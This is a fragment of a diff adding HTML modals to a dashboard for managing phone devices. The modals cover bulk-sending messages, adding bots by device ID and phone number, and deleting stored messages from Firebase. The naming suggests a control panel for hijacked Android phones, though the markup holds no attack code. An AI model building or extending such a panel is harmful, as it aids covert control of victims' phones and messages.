+</div>
+<label class="fl">Message</label><textarea class="sarea" id="bulkMsg" placeholder="Message for all selected devices..."></textarea>
+<button type="button" class="bulk-send" onclick="fireBulk()">🚀 Send to Selected</button>
+<div class="sres" id="bulkRes" style="margin-top:10px"></div>
+<div class="mbtns" style="margin-top:14px"><button class="mcnc" onclick="closeM('bulkModal')">Close</button></div>
+</div></div>
+
+<div class="overlay" id="addModal"><div class="modal"><div class="mt">＋ Add Device</div><label class="fl">Device ID</label><input class="fi" id="aId" placeholder="8f7e95a20dd55c45"><label class="fl">Name</label><input class="fi" id="aN" placeholder="SM-A055F"><label class="fl">Phone</label><input class="fi" id="aP" placeholder="+919876543210"><div class="mbtns"><button class="mcnc" onclick="closeM('addModal')">Cancel</button><button class="mok" onclick="addBot()">Add</button></div></div></div>
+<div class="overlay" id="updModal"><div class="modal"><div class="mt">✎ Update Number</div><label class="fl">Device ID</label><input class="fi" id="uId" placeholder="Paste device ID"><label class="fl">New Phone</label><input class="fi" id="uP" placeholder="+919876543210"><div class="mbtns"><button class="mcnc" onclick="closeM('updModal')">Cancel</button><button class="mok" onclick="updNum()">Update</button></div></div></div>
+<div class="overlay" id="confirmModal"><div class="modal"><div class="mt" id="confT">Confirm</div><p id="confM" style="color:var(--sub);font-size:13px;margin-bottom:18px;line-height:1.7"></p><div class="mbtns"><button class="mcnc" onclick="closeM('confirmModal')">Cancel</button><button class="mok danger" id="confOk">Delete</button></div></div></div>
+
+<!-- DELETE SINGLE MESSAGE MODAL -->
+<div class="overlay" id="delMsgModal"><div class="modal" id="delMsgModalBox" style="max-width:360px">
+<div class="mt" style="color:var(--rose)">🗑 Delete Message?</div>
+<p id="delMsgPreview" style="color:var(--sub);font-size:12px;margin-bottom:18px;line-height:1.7;font-family:'Share Tech Mono',monospace;background:var(--bg3);padding:10px;border-radius:8px;max-height:80px;overflow:hidden;text-overflow:ellipsis;"></p>
+<div class="mbtns"><button class="mcnc" onclick="closeM('delMsgModal')">Cancel</button><button class="mok danger" id="delMsgOk">Delete</button></div>
+</div></div>
+
+<!-- ★ NEW: DELETE ALL MESSAGES MODAL -->
+<div class="overlay" id="delAllMsgsModal"><div class="modal" style="max-width:400px">
+<div class="mt" style="color:var(--rose)">🔥 Delete ALL Messages?</div>
+<p id="delAllMsgsInfo" style="color:var(--sub);font-size:13px;margin-bottom:6px;line-height:1.7"></p>
+<div style="background:rgba(255,107,107,.07);border:1px solid rgba(255,107,107,.2);border-radius:10px;padding:12px 16px;margin-bottom:18px;">
+  <div style="font-size:11px;color:var(--rose);font-weight:700;letter-spacing:.5px">⚠ This cannot be undone. All messages for this device will be permanently deleted from Firebase.</div>
+</div>
+<div class="mbtns"><button class="mcnc" onclick="closeM('delAllMsgsModal')">Cancel</button><button class="mok danger" id="delAllMsgsOk">🔥 Delete All</button></div>
+</div></div>
+
+
+
+<div class="toast" id="toastEl"></div>
+
+<script src="script-1.js"></script>
+
+<script src="script-2.js"></script>
+
+<script src="script-3.js"></script>
+
+
+</body></html>
